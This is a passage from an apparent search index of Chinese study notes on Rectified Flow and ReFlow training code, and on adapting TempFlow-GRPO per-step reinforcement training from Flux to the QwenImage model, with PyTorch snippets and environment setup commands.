<p>\u8fd9\u65f6\u5019\u5b58\u5728\u4e00\u4e2a\u89e3\u51b3\u65b9\u6848\uff0c\u90a3\u5c31\u662f\u518d\u8bad\u7ec3\u4e00\u6bb5\u3002Rectified Flow\u76f8\u6bd4\u4e8eFlow Matching\u6700\u5927\u7684\u533a\u522b\u5c31\u662f\u5728\u5e38\u89c4\u7684Flow matching\u7ed3\u675f\u540e\uff0c\u591a\u4e86\u4e00\u6bb5\u8bad\u7ec3\u8fc7\u7a0b\uff0c\u8be5\u8bad\u7ec3\u8fc7\u7a0b\u4e2d\u4f7f\u7528\u7684\u6570\u636e\u662f\u4e00\u9636\u6bb5\u8bad\u7ec3\u597d\u7684Flow Model\u91c7\u6837\u51fa\u6765\u7684</p> <p>\u7ecf\u8fc7\u7b2c\u4e8c\u9636\u6bb5\u7684\u8bad\u7ec3\u4e4b\u540e\u7684Flow Model\uff0c\u53ef\u4ee5\u505a\u5230\u5feb\u901f\u91c7\u6837\uff0c\u56e0\u4e3a\u8fd9\u4e2a\u8fc7\u7a0b\u5b8c\u6210\u4e86\u53bb\u4ea4\u53c9\u70b9\u7684\u5185\u5bb9</p> <p></p> <p>\u8fd9\u5f20\u56fe\u76f4\u89c2\u7684\u7ed9\u6211\u4eec\u5c55\u793a\u4e86Recified Flow\u7684\u5a01\u529b\uff0c\u672a\u7ecf\u5386\u8fc7\u4e8c\u9636\u6bb5\u8bad\u7ec3\u7684\u6a21\u578b\uff0c\u4e00\u5f00\u59cb\u4f1a\u7ed9\u6211\u4eec\u53bb\u566a\u51fa\u4e00\u4e2a\u56fe\u50cf\u7684\u5e73\u5747\u503c\uff0c\u8fd9\u4e2a\u5e73\u5747\u503c\u5f80\u5f80\u5c31\u662f\u4e00\u4e2a\u4ea4\u53c9\u70b9\uff0c\u9700\u8981\u591a\u6b65\u624d\u80fd\u5b9e\u73b0\u51c6\u786e\u7684\u751f\u6210\uff0c\u800c\u7ecf\u8fc7Rectified\u7684\u6a21\u578b\uff0c\u4ece\u521d\u59cb\u72b6\u6001\u5c31\u77e5\u9053\u81ea\u5df1\u8be5\u5f80\u54ea\u4e2a\u65b9\u5411\u8d70\uff0c\u56e0\u6b64\u8fc5\u901f\u5c31\u80fd\u591f\u751f\u6210\u60f3\u8981\u7684\u65b9\u5411\uff0c\u5f53\u7136\u591a\u6b65\u4e5f\u4f1a\u505a\u7684\u66f4\u597d</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/Rectified%20Flow/#2-reflow","title":"2. ReFlow \u4ee3\u7801","text":"<p>\u8fd9\u662f\u6211\u5728Minst\u6570\u636e\u96c6\u4e0a\u7684\u8bad\u7ec3\u7ed3\u679c\uff0c\u56e0\u4e3a\u6570\u636e\u96c6\u6bd4\u8f83\u7b80\u5355\uff0c\u6240\u4ee5\u57282\u6b65\u4ee5\u4e0a\u7684\u53bb\u566a\u4e2d\u5c31\u663e\u5f97\u533a\u522b\u4e0d\u5927\uff0c\u4f46\u662f\u5f88\u660e\u663e\u7684\uff0cReFlow\u7684\u6a21\u578b\u53ef\u4ee5\u5728\u7b2c\u4e00\u6b65\u53bb\u566a\u4e2d\u5c31\u5f97\u5230\u5f88\u597d\u7684\u7ed3\u679c</p> <p>\u5177\u4f53\u7684\u4ee3\u7801\u5982\u4e0b\uff0c\u57fa\u672c\u7684\u8bad\u7ec3\u548cflow model\u6ca1\u6709\u4ec0\u4e48\u533a\u522b\uff0c\u4ec5\u4ec5\u662f\u6570\u636e\u4e0a\u4f7f\u7528\u4e86flow model\u751f\u6210\u7684\u6570\u636e</p> <pre><code>@torch.no_grad()\ndef generate_paired_data(model, num_pairs, device=\"cuda\"):\n    \"\"\"\n    \u4f7f\u7528\u9884\u8bad\u7ec3\u7684flow matching\u6a21\u578b\u751f\u6210\u914d\u5bf9\u6570\u636e (x0, x1, label)\n    x0: \u521d\u59cb\u566a\u58f0\n    x1: \u751f\u6210\u7684\u56fe\u50cf\uff08\u5bf9\u5e94\u771f\u5b9e\u6570\u636e\u5206\u5e03\uff09\n\n    Rectified Flow\u7684\u6838\u5fc3\u601d\u60f3\uff1a\n    - \u4f7f\u7528\u9884\u8bad\u7ec3\u6a21\u578b\u4ece\u566a\u58f0\u751f\u6210\u6837\u672c\uff0c\u5f97\u5230\u8f68\u8ff9\u7684\u8d77\u70b9\u548c\u7ec8\u70b9\n    - \u91cd\u65b0\u8bad\u7ec3\u6a21\u578b\u5b66\u4e60\u8fd9\u4e9b\u8d77\u70b9\u548c\u7ec8\u70b9\u4e4b\u95f4\u66f4\u76f4\u7684\u8def\u5f84\n    \"\"\"\n    model.eval()\n\n    x0_list = []\n    x1_list = []\n    label_list = []\n\n    # \u5206\u6279\u751f\u6210\uff0c\u907f\u514d\u5185\u5b58\u6ea2\u51fa\n    num_batches = (num_pairs + batch_size - 1) // batch_size\n\n    print(f\"\u5f00\u59cb\u751f\u6210 {num_pairs} \u5bf9\u914d\u5bf9\u6570\u636e...\")\n\n    for i in range(num_batches):\n        current_batch_size = min(batch_size, num_pairs - i * batch_size)\n\n        # \u968f\u673a\u91c7\u6837\u566a\u58f0\u4f5c\u4e3a\u8d77\u70b9 x0\n        x0 = torch.randn(current_batch_size, channels, image_size, image_size, device=device)\n\n        # \u968f\u673a\u91c7\u6837\u6807\u7b7e\n        labels = torch.randint(0, num_classes, (current_batch_size,), device=device)\n\n        # \u4f7f\u7528ODE\u6c42\u89e3\u5668\u4ecex0\u751f\u6210x1\n        def ode_func(t: torch.Tensor, x: torch.Tensor):\n            t_expanded = t.expand(x.size(0))\n            vt = model(x, t_expanded, labels)\n            return vt\n\n        t_eval = torch.tensor([0.0, 1.0], device=device)\n        trajectory = odeint(ode_func, x0, t_eval, rtol=1e-5, atol=1e-5, method='dopri5')\n        x1 = trajectory[-1]  # \u53d6\u6700\u7ec8\u65f6\u523b\u7684\u72b6\u6001\n\n        x0_list.append(x0.cpu())\n        x1_list.append(x1.cpu())\n        label_list.append(labels.cpu())\n\n        if (i + 1) % 10 == 0:\n            print(f\"\u5df2\u751f\u6210 {(i + 1) * batch_size} / {num_pairs} \u5bf9\u6570\u636e\")\n\n    # \u62fc\u63a5\u6240\u6709\u6279\u6b21\n    x0_all = torch.cat(x0_list, dim=0)[:num_pairs]\n    x1_all = torch.cat(x1_list, dim=0)[:num_pairs]\n    labels_all = torch.cat(label_list, dim=0)[:num_pairs]\n\n    print(f\"\u914d\u5bf9\u6570\u636e\u751f\u6210\u5b8c\u6210\uff01\u5f62\u72b6: x0={x0_all.shape}, x1={x1_all.shape}, labels={labels_all.shape}\")\n\n    return x0_all, x1_all, labels_all\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/TempFlowGRPO%20on%20QwenImage/","title":"TempFlowGRPO on QwenImage","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/TempFlowGRPO%20on%20QwenImage/#_1","title":"\u76ee\u5f55","text":"<ul> <li>\u6982\u8ff0</li> <li>\u7b2c\u4e00\u6b21\u4fee\u6539\uff1aPipeline \u9002\u914d</li> <li>\u7b2c\u4e8c\u6b21\u4fee\u6539\uff1a\u8bad\u7ec3\u811a\u672c\u9002\u914d</li> <li>QwenImage \u8bad\u7ec3\u6d41\u7a0b\u8be6\u89e3</li> <li>\u5173\u952e\u5dee\u5f02\u603b\u7ed3</li> </ul> <p>\u914d\u7f6e\u542f\u52a8</p> <pre><code>conda create --prefix /share/project/wanli/env/verl-latest python=3.10\n\nconda activate /share/project/wanli/env/flow_grpo\nexport PYTHONPATH=$PYTHONPATH:/share/project/wanli/wanli_yk/TempFlow-GRPO\nexport WANDB_API_KEY=API_KEY\n</code></pre> <ul> <li>\u6539\u7528\u4e86torch.run</li> <li>\u65b0\u589e\u4e86fsdp_utils.py</li> <li>dgx\u6587\u4ef6\u91cc\u65b0\u589e\u4e86\u4e00\u4e2aQwen-image\u7684\u914d\u7f6e</li> <li>sd3_sde_with_logprob.py \u8fd9\u4e2a\u6587\u4ef6\u6539\u4e3a\u4e86\u6700\u65b0\u7248\u672cFlow-GRPO\u7684</li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/TempFlowGRPO%20on%20QwenImage/#_2","title":"\u6982\u8ff0","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/TempFlowGRPO%20on%20QwenImage/#_3","title":"\u80cc\u666f","text":"<p>\u9879\u76ee\u4e2d\u5b58\u5728\u4e24\u79cd\u8bad\u7ec3\u8303\u5f0f\uff1a 1. \u5e38\u89c4\u8bad\u7ec3\uff1a\u5728 SDE \u7a97\u53e3\u5185\u91c7\u6837\uff0c\u53ea\u4fdd\u5b58\u7a97\u53e3\u5185\u7684\u4e2d\u95f4\u72b6\u6001 2. Per-step \u8bad\u7ec3\uff1a\u5bf9\u6bcf\u4e2a denoising \u6b65\u9aa4\u8fdb\u884c\u5206\u652f\u91c7\u6837\uff0c\u751f\u6210\u5b8c\u6574\u56fe\u50cf\u5e76\u5206\u522b\u8ba1\u7b97\u5956\u52b1</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/TempFlowGRPO%20on%20QwenImage/#_4","title":"\u76ee\u6807","text":"<p>\u5c06 Flux \u6a21\u578b\u7684 per-step \u8bad\u7ec3\u65b9\u6cd5\u9002\u914d\u5230 QwenImage \u6a21\u578b\uff0c\u5305\u62ec\uff1a - Pipeline \u5c42\u9762\u7684\u6539\u9020 - \u8bad\u7ec3\u811a\u672c\u7684\u5b8c\u6574\u9002\u914d</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/TempFlowGRPO%20on%20QwenImage/#pipeline","title":"\u7b2c\u4e00\u6b21\u4fee\u6539\uff1aPipeline \u9002\u914d","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/TempFlowGRPO%20on%20QwenImage/#_5","title":"\u6e90\u6587\u4ef6\u4e0e\u76ee\u6807\u6587\u4ef6","text":"<ul> <li>\u53c2\u8003\u6587\u4ef6\uff1a<code>flux_pipeline_with_logprob_perstep.py</code></li> <li>\u57fa\u7840\u6587\u4ef6\uff1a<code>qwenimage_pipeline_with_logprob.py</code></li> <li>\u76ee\u6807\u6587\u4ef6\uff1a<code>qwenimage_pipeline_with_logprob_perstep.py</code></li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/TempFlowGRPO%20on%20QwenImage/#_6","title":"\u6838\u5fc3\u4fee\u6539\u601d\u8def","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/TempFlowGRPO%20on%20QwenImage/#1","title":"1. \u79fb\u9664\u7a97\u53e3\u673a\u5236","text":"<p>\u5e38\u89c4\u7248\u672c\u6709\u4ee5\u4e0b\u53c2\u6570\uff1a <pre><code>noise_level: float = 0.7,\nprocess_index: int = 0,\nsde_window_size: int = 0,\nsde_window_range: tuple[int, int] = (0, 5),\n</code></pre></p> <p>Per-step \u7248\u672c\u66ff\u6362\u4e3a\uff1a <pre><code>determistic: bool = True,\n</code></pre></p> <p>\u539f\u56e0\uff1aPer-step \u7248\u672c\u9700\u8981\u904d\u5386\u6240\u6709\u65f6\u95f4\u6b65\uff0c\u4e0d\u9700\u8981\u7a97\u53e3\u9650\u5236\u3002</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/TempFlowGRPO%20on%20QwenImage/#2","title":"2. \u53cc\u8f68\u5904\u7406\u673a\u5236","text":"<p>\u5728\u6bcf\u4e2a\u65f6\u95f4\u6b65\u540c\u65f6\u8ba1\u7b97 ODE \u548c SDE \u4e24\u6761\u8def\u5f84\uff1a</p> <pre><code># ODE \u5206\u652f - \u7528\u4e8e\u4e3b\u6d41\u7a0b\u63a8\u8fdb\node_latents, _, _, _ = sde_step_with_logprob(\n    self.scheduler,\n    noise_pred.float(),\n    t.unsqueeze(0).repeat(latents.shape[0]),\n    latents.float(),\n    determistic=True,\n)\n\n# SDE \u5206\u652f - \u7528\u4e8e\u751f\u6210\u8bad\u7ec3\u6837\u672c\nsde_latents, log_prob, prev_latents_mean, std_dev_t = sde_step_with_logprob(\n    self.scheduler,\n    noise_pred.float(),\n    t.unsqueeze(0),\n    latents.float(),\n    determistic=False,\n)\n\n# \u4e3b\u6d41\u7a0b\u4f7f\u7528 ODE\nlatents = ode_latents\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/TempFlowGRPO%20on%20QwenImage/#3-per-step","title":"3. Per-step \u56fe\u50cf\u751f\u6210","text":"<p>\u4ece\u6bcf\u4e2a SDE \u91c7\u6837\u70b9\u5f00\u59cb\uff0c\u4f7f\u7528 ODE \u5b8c\u6210\u5269\u4f59\u6b65\u9aa4\uff1a</p> <pre><code># SDE sample branch, then ode process\ninner_latents = sde_latents.clone()\nfor inner_i, inner_t in enumerate(timesteps[i+1:]):\n    inner_timestep = inner_t.expand(inner_latents.shape[0]).to(inner_latents.dtype)\n\n    # \u6267\u884c\u5b8c\u6574\u7684 transformer \u524d\u5411\u4f20\u64ad\uff08\u5305\u542b CFG\uff09\n    inner_noise_pred = self.transformer(\n        hidden_states=torch.cat([inner_latents, inner_latents], dim=0),\n        timestep=torch.cat([inner_timestep, inner_timestep], dim=0) / 1000,\n        guidance=guidance,\n        encoder_hidden_states_mask=torch.cat([\n            prompt_embeds_mask.repeat_interleave(inner_latents.shape[0]//prompt_embeds.shape[0], dim=0),\n            negative_prompt_embeds_mask.repeat_interleave(inner_latents.shape[0]//prompt_embeds.shape[0], dim=0)\n        ], dim=0),\n        encoder_hidden_states=torch.cat([\n            prompt_embeds.repeat_interleave(inner_latents.shape[0]//prompt_embeds.shape[0], dim=0),\n            negative_prompt_embeds.repeat_interleave(inner_latents.shape[0]//prompt_embeds.shape[0], dim=0)\n        ], dim=0),\n        img_shapes=img_shapes*2,\n        txt_seq_lens=txt_seq_lens+negative_txt_seq_lens,\n    )[0]\n\n    # \u5e94\u7528 CFG\n    inner_noise_pred, inner_neg_noise_pred = inner_noise_pred.chunk(2, dim=0)\n    inner_comb_pred = inner_neg_noise_pred + true_cfg_scale * (inner_noise_pred - inner_neg_noise_pred)\n    inner_cond_norm = torch.norm(inner_noise_pred, dim=-1, keepdim=True)\n    inner_noise_norm = torch.norm(inner_comb_pred, dim=-1, keepdim=True)\n    inner_noise_pred = inner_comb_pred * (inner_cond_norm / inner_noise_norm)\n\n    # ODE step\n    inner_latents, _, _, _ = sde_step_with_logprob(\n        self.scheduler,\n        inner_noise_pred.float(),\n        inner_t.unsqueeze(0),\n        inner_latents.float(),\n        determistic=True,\n    )\n\n# \u89e3\u7801\u4e3a\u56fe\u50cf\ninner_latents = self._unpack_latents(inner_latents, height, width, self.vae_scale_factor)\ninner_latents = inner_latents.to(self.vae.dtype)\n# QwenImage \u7279\u6709\u7684 latent \u5f52\u4e00\u5316\nlatents_mean = (\n    torch.tensor(self.vae.config.latents_mean)\n    .view(1, self.vae.config.z_dim, 1, 1, 1)\n    .to(inner_latents.device, inner_latents.dtype)\n)\nlatents_std = 1.0 / torch.tensor(self.vae.config.latents_std).view(1, self.vae.config.z_dim, 1, 1, 1).to(\n    inner_latents.device, inner_latents.dtype\n)\ninner_latents = inner_latents / latents_std + latents_mean\ninner_image = self.vae.decode(inner_latents, return_dict=False)[0][:, :, 0]\ninner_image = self.image_processor.postprocess(inner_image, output_type=output_type)\nall_image.append(inner_image)\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/TempFlowGRPO%20on%20QwenImage/#4-qwenimage","title":"4. QwenImage \u7279\u6709\u9002\u914d","text":"<p>a) Transformer \u8c03\u7528\u5dee\u5f02</p> <p>Flux \u4f7f\u7528\uff1a <pre><code>noise_pred = self.transformer(\n    hidden_states=latents,\n    timestep=timestep / 1000,\n    guidance=guidance,\n    pooled_projections=pooled_prompt_embeds,\n    encoder_hidden_states=prompt_embeds,\n    txt_ids=text_ids,\n    img_ids=latent_image_ids,\n    joint_attention_kwargs=self.joint_attention_kwargs,\n    return_dict=False,\n)[0]\n</code></pre></p> <p>QwenImage \u4f7f\u7528\uff1a <pre><code>noise_pred = self.transformer(\n    hidden_states=torch.cat([latents, latents], dim=0),  # CFG \u9700\u8981\u62fc\u63a5\n    timestep=torch.cat([timestep, timestep], dim=0) / 1000,\n    guidance=guidance,\n    encoder_hidden_states_mask=torch.cat([prompt_embeds_mask, negative_prompt_embeds_mask], dim=0),\n    encoder_hidden_states=torch.cat([prompt_embeds], negative_prompt_embeds], dim=0),\n    img_shapes=img_shapes*2,\n    txt_seq_lens=txt_seq_lens+negative_txt_seq_lens,\n)[0]\n</code></pre></p> <p>\u5173\u952e\u5dee\u5f02\uff1a - QwenImage \u9700\u8981\u624b\u52a8\u5b9e\u73b0 CFG\uff08\u62fc\u63a5\u6b63\u8d1f\u6837\u672c\uff09 - \u9700\u8981\u63d0\u4f9b <code>encoder_hidden_states_mask</code>\u3001<code>img_shapes</code>\u3001<code>txt_seq_lens</code> - \u540e\u7eed\u9700\u8981\u624b\u52a8\u5e94\u7528 CFG \u7f29\u653e\u548c\u5f52\u4e00\u5316</p> <p>b) CFG \u5904\u7406</p> <p>QwenImage \u9700\u8981\u624b\u52a8\u8ba1\u7b97 CFG\uff1a <pre><code>noise_pred, neg_noise_pred = noise_pred.chunk(2, dim=0)\ncomb_pred = neg_noise_pred + true_cfg_scale * (noise_pred - neg_noise_pred)\n\n# \u5f52\u4e00\u5316\u5904\u7406\uff08\u4fdd\u6301\u6761\u4ef6\u9884\u6d4b\u7684\u8303\u6570\uff09\ncond_norm = torch.norm(noise_pred, dim=-1, keepdim=True)\nnoise_norm = torch.norm(comb_pred, dim=-1, keepdim=True)\nnoise_pred = comb_pred * (cond_norm / noise_norm)\n</code></pre></p> <p>c) VAE \u89e3\u7801\u5dee\u5f02</p> <p>Flux\uff1a <pre><code>latents = (latents / self.vae.config.scaling_factor) + self.vae.config.shift_factor\nimage = self.vae.decode(latents, return_dict=False)[0]\n</code></pre></p> <p>QwenImage\uff1a <pre><code>latents = self._unpack_latents(latents, height, width, self.vae_scale_factor)\nlatents = latents.to(self.vae.dtype)\nlatents_mean = torch.tensor(self.vae.config.latents_mean).view(1, self.vae.config.z_dim, 1, 1, 1).to(latents.device, latents.dtype)\nlatents_std = 1.0 / torch.tensor(self.vae.config.latents_std).view(1, self.vae.config.z_dim, 1, 1, 1).to(latents.device, latents.dtype)\nlatents = latents / latents_std + latents_mean\nimage = self.vae.decode(latents, return_dict=False)[0][:, :, 0]  # \u6ce8\u610f\u6700\u540e\u7684 [:, :, 0]\n</code></pre></p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/TempFlowGRPO%20on%20QwenImage/#5","title":"5. \u8fd4\u56de\u503c\u53d8\u5316","text":"<p>\u5e38\u89c4\u7248\u672c\uff1a <pre><code>return {\n    \"images\": image,\n    \"all_latents\": all_latents,\n    \"all_log_probs\": all_log_probs,\n    \"all_timesteps\": all_timesteps,\n    \"prompt_embeds\": prompt_embeds,\n    \"negative_prompt_embeds\": negative_prompt_embeds,\n    \"prompt_embeds_mask\": prompt_embeds_mask,\n    \"negative_prompt_embeds_mask\": negative_prompt_embeds_mask,\n}\n</code></pre></p> <p>Per-step \u7248\u672c\uff1a <pre><code>return all_image, all_latents, all_sde_latents, all_log_probs, prompt_embeds, negative_prompt_embeds, prompt_embeds_mask, negative_prompt_embeds_mask\n</code></pre></p> <p>\u8fd4\u56de <code>all_image</code> \u5217\u8868\uff0c\u5305\u542b\u6bcf\u4e2a\u65f6\u95f4\u6b65\u751f\u6210\u7684\u5b8c\u6574\u56fe\u50cf\u3002</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/TempFlowGRPO%20on%20QwenImage/#_7","title":"\u7b2c\u4e8c\u6b21\u4fee\u6539\uff1a\u8bad\u7ec3\u811a\u672c\u9002\u914d","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/TempFlowGRPO%20on%20QwenImage/#_8","title":"\u6e90\u6587\u4ef6\u4e0e\u76ee\u6807\u6587\u4ef6","text":"<ul> <li>\u53c2\u8003\u6587\u4ef6\uff1a<code>train_flux_pr.py</code></li> <li>\u57fa\u7840\u6587\u4ef6\uff1a<code>train_qwenimage.py</code></li> <li>\u76ee\u6807\u6587\u4ef6\uff1a<code>train_qwenimage_pr.py</code></li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/TempFlowGRPO%20on%20QwenImage/#_9","title":"\u6838\u5fc3\u4fee\u6539\u601d\u8def","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/TempFlowGRPO%20on%20QwenImage/#1_1","title":"1. \u5bfc\u5165\u6a21\u5757\u66f4\u65b0","text":"<p>\u6dfb\u52a0 per-step \u7248\u672c\u7684\u51fd\u6570\uff1a <pre><code>from flow_grpo.diffusers_patch.qwenimage_pipeline_with_logprob import pipeline_with_logprob\nfrom flow_grpo.diffusers_patch.qwenimage_pipeline_with_logprob_perstep import pipeline_with_logprob as pipeline_with_logprob_perstep\nfrom flow_grpo.diffusers_patch.sd3_sde_with_logprob_perstep import sde_step_with_logprob as sde_step_with_logprob_perstep\n</code></pre></p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/TempFlowGRPO%20on%20QwenImage/#2-compute_log_prob","title":"2. compute_log_prob \u51fd\u6570\u4fee\u6539","text":"<p>\u4f7f\u7528 per-step \u7248\u672c\u7684 sde_step\uff1a <pre><code>def compute_log_prob(transformer, pipeline, sample, j, config, rank):\n    # ... transformer \u524d\u5411\u4f20\u64ad\u548c CFG \u5904\u7406 ...\n\n    # \u4f7f\u7528 perstep \u7248\u672c\uff0c\u6dfb\u52a0 determistic \u53c2\u6570\n    prev_sample, log_prob, prev_sample_mean, std_dev_t = sde_step_with_logprob_perstep(\n        pipeline.scheduler,\n        noise_pred.float(),\n        sample[\"timesteps\"][:, j],\n        sample[\"latents\"][:, j].float(),\n        prev_sample=sample[\"next_latents\"][:, j].float(),\n        determistic=False,  # \u8bad\u7ec3\u65f6\u4f7f\u7528\u968f\u673a\u91c7\u6837\n    )\n\n    return prev_sample, log_prob, prev_sample_mean, std_dev_t\n</code></pre></p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/TempFlowGRPO%20on%20QwenImage/#3-eval","title":"3. eval \u51fd\u6570\u4fee\u6539","text":"<p>\u8bc4\u4f30\u65f6\u4f7f\u7528\u786e\u5b9a\u6027\u91c7\u6837\uff1a <pre><code>def eval(pipeline, test_dataloader, config, rank, local_rank, world_size, device, global_step, reward_fn, executor, autocast, ema, transformer_trainable_parameters):\n    # ...\n    collected_data = pipeline_with_logprob(\n        pipeline,\n        prompts,\n        negative_prompt=[\" \"]*len(prompts),\n        num_inference_steps=config.sample.eval_num_steps,\n        true_cfg_scale=config.sample.guidance_scale,\n        output_type=\"pt\",\n        height=config.resolution,\n        width=config.resolution,\n        determistic=True,  # \u8bc4\u4f30\u65f6\u4f7f\u7528 ODE\n    )\n    # ...\n</code></pre></p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/TempFlowGRPO%20on%20QwenImage/#4","title":"4. \u91c7\u6837\u9636\u6bb5\u6838\u5fc3\u6539\u52a8","text":"<p>a) \u4f7f\u7528 per-step pipeline\uff1a <pre><code>with autocast():\n    with torch.no_grad():\n        images, latents, sde_latents, log_probs, prompt_embeds, negative_prompt_embeds, prompt_embeds_mask, negative_prompt_embeds_mask = pipeline_with_logprob_perstep(\n            pipeline,\n            prompts,\n            negative_prompt=[\" \"]*len(prompts),\n            num_inference_steps=config.sample.num_steps,\n            true_cfg_scale=config.sample.guidance_scale,\n            output_type=\"pil\",\n            height=config.resolution,\n            width=config.resolution,\n            generator=generator,\n            determistic=False,  # \u91c7\u6837\u65f6\u4f7f\u7528 SDE\n        )\n</code></pre></p> <p>b) \u5206\u652f\u63a2\u7d22\u673a\u5236\uff1a <pre><code>exploration_k = 6  # \u6bcf\u4e2a prompt \u751f\u6210 6 \u4e2a\u5206\u652f\n\n# \u6269\u5c55 latents\nlatents = torch.stack(latents, dim=1).repeat_interleave(exploration_k, dim=0)\n# (batch_size * exploration_k, num_steps + 1, seq_len, channels)\n\nsde_latents = torch.stack(sde_latents, dim=1)\n# (batch_size, num_steps, seq_len, channels)\n\nlog_probs = torch.stack(log_probs, dim=1)\n# (batch_size, num_steps)\n\n# \u6269\u5c55 prompts\nprompts = [prompts[i] for i in torch.arange(len(prompts)).repeat_interleave(exploration_k)]\nprompt_metadata = [prompt_metadata[i] for i in torch.arange(len(prompt_metadata)).repeat_interleave(exploration_k)]\n</code></pre></p> <p>c) \u91cd\u5efa timesteps\uff1a <pre><code>from diffusers.pipelines.stable_diffusion_3.pipeline_stable_diffusion_3 import retrieve_timesteps\nfrom diffusers.pipelines.qwenimage.pipeline_qwenimage import calculate_shift\n\nsigmas = np.linspace(1.0, 1 / config.sample.num_steps, config.sample.num_steps)\nimage_seq_len = latents.shape[2]\nmu = calculate_shift(\n    image_seq_len,\n    pipeline.scheduler.config.get(\"base_image_seq_len\", 256),\n    pipeline.scheduler.config.get(\"max_image_seq_len\", 4096),\n    pipeline.scheduler.config.get(\"base_shift\", 0.5),\n    pipeline.scheduler.config.get(\"max_shift\", 1.15),\n)\ntimesteps, _ = retrieve_timesteps(\n    pipeline.scheduler,\n    config.sample.num_steps,\n    device,\n    sigmas=sigmas,\n    mu=mu,\n)\ntimesteps = timesteps.repeat(config.sample.train_batch_size*exploration_k, 1)\n</code></pre></p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/TempFlowGRPO%20on%20QwenImage/#5-rewards","title":"5. Rewards \u5904\u7406\u6539\u52a8","text":"<p>a) Per-step \u5956\u52b1\u8ba1\u7b97\uff1a <pre><code># images \u662f\u4e00\u4e2a\u5217\u8868\uff0c\u6bcf\u4e2a\u5143\u7d20\u5bf9\u5e94\u4e00\u4e2a\u65f6\u95f4\u6b65\u7684\u6240\u6709\u56fe\u50cf\nrewards = []\nfor im in images:  # \u904d\u5386\u6bcf\u4e2a\u65f6\u95f4\u6b65\n    rewards.append(executor.submit(reward_fn, im, prompts, prompt_metadata, only_strict=True))\n</code></pre></p> <p>b) \u5956\u52b1\u805a\u5408\uff1a <pre><code>tmp_rewards = {}\nfor item in sample['rewards']:  # \u904d\u5386\u6bcf\u4e2a\u65f6\u95f4\u6b65\u7684 reward future\n    rewards, reward_metadata = item.result()\n    for key, value in rewards.items():\n        if key not in tmp_rewards.keys():\n            tmp_rewards[key] = []\n\n        if config.prompt_fn == \"geneval\" or list(config.reward_fn.keys()) == [\"hpsv3\"]:\n            tmp_rewards[key].append(torch.as_tensor(value, device=device).float())\n        else:\n            if isinstance(value, list):\n                value = torch.stack(value, dim=0)\n            tmp_rewards[key].append(value)\n\n# \u6309 timestep \u7ef4\u5ea6\u5806\u53e0\nfor key, value in tmp_rewards.items():\n    tmp_rewards[key] = torch.stack(tmp_rewards[key], dim=1)\n    # \u7ed3\u679c\u5f62\u72b6\uff1a(batch_size, num_steps)\n</code></pre></p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/TempFlowGRPO%20on%20QwenImage/#6","title":"6. \u6837\u672c\u6570\u636e\u7ed3\u6784","text":"<pre><code>samples.append({\n    \"prompt_ids\": prompt_ids.repeat_interleave(exploration_k, dim=0),\n    \"prompt_embeds\": prompt_embeds.repeat_interleave(exploration_k, dim=0),\n    \"prompt_embeds_mask\": prompt_embeds_mask.repeat_interleave(exploration_k, dim=0),\n    \"negative_prompt_embeds\": negative_prompt_embeds.repeat_interleave(exploration_k, 